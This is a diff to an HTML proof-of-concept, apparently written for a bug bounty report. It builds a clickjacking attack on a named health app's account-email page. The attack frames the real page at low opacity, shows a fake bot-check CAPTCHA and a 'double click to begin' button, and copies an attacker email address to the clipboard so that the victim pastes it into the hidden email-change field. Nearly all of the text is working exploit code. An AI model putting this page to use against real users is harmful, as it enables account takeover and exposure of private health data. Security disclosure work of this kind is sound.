@@ -21,8 +21,9 @@
         #oliviaIframe {
             width: 100%;
             position: absolute;
-            z-index: 1;
+            z-index: 2;
             opacity: 0.3;
+            pointer-events: auto;
         }
 
         #startButton {
@@ -60,6 +61,7 @@
             justify-content: flex-start;
             align-items: center;
             padding-top: 1.2rem;
+            display: none;
         }
 
         #copyButton, #verifyButton {
@@ -96,13 +98,25 @@
         #verifyButton {
             z-index: -1;
         }
+
+        #startPayload {
+            position: fixed;
+            left: 0;
+            top: 70px;
+            bottom: 0;
+            right: 0;
+            margin: auto;
+            width: 300px;
+            height: 30px;
+        }
         </style>
     </head>
     <body>
-        <iframe id="oliviaIframe" src="https://app.oliviahealth.ai/account/email"></iframe>
+        <button onclick="startPayload()" id="startPayload">DOUBLE CLICK TO BEGIN</button>
+        <iframe id="oliviaIframe" src="https://app.oliviahealth.ai/login"></iframe>
         <h1>PoC Created By: n30@bugcrowdninja.com</h1>
         <p id="verificationText">In order to access this site, verify you're not a bot:</p>
-        <div class="payload">
+        <div class="payload" id="payload">
             <ol>
                 <li>Click the "COPY CAPTCHA CODE" below</li>
                 <li>Click 3 times on the box then paste with CTRL+V or Mouse</li>
@@ -116,6 +130,17 @@
         </div>
     </body>
     <script>
+
+        function startPayload() {
+            document.getElementById("startPayload").style = "display: none";
+            document.getElementById("payload").style = "display: flex";
+
+            // Show the payload <div>
+            setTimeout(() => {
+                document.getElementById("oliviaIframe").src = "https://app.oliviahealth.ai/account/email";
+            }, 3000);
+        }
+
         function copyCaptcha() {
             const textToCopy = "attacker@attacker.com"; // CHANGE THIS TO YOUR ATTACKER EMAIL
             
